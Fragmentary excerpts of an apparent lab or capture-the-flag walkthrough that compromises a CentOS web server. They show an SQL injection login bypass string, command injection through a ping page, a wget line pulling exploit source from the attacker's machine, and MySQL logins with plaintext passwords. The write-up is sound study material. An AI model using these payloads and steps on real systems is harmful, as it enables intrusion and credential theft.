...
The first thing that came to mind when seeing a login form like this one was SQL injection. Entering 1'or'1'='1 in both fields showed this partcular form's susceptibility to SQL injection as I was given to some kind of application that lets you ping other machines:
...
This means the application is vulnerable to command injection and I can execute commands directly on the target machine through this application. I then tried using this point of entry to give myself a reverse shell on the target machine. This could be done as follows:
...
I tried using `uname -a` on the target machine for version info, but I couldn't find any exploits that worked with this method. I also checked the specific CentOS version with `ls /etc/*release*` and `cat /etc/redhat-release`, but both exploits found for this particular version don't seem to work and the source code doesn't help much in figuring out why.
...
```sh
wget http://192.168.56.102:7777/9545.c
...
```sh
mysql -ujohn -phiroshima -e "show databases;"
Database
mysql
test
webapp
...
```sh
mysql -uroot -phiroshima -e "show databases;"
Database
mysql
test
webapp
...
With root access you can easily change current credentials, add new ones, etc.:
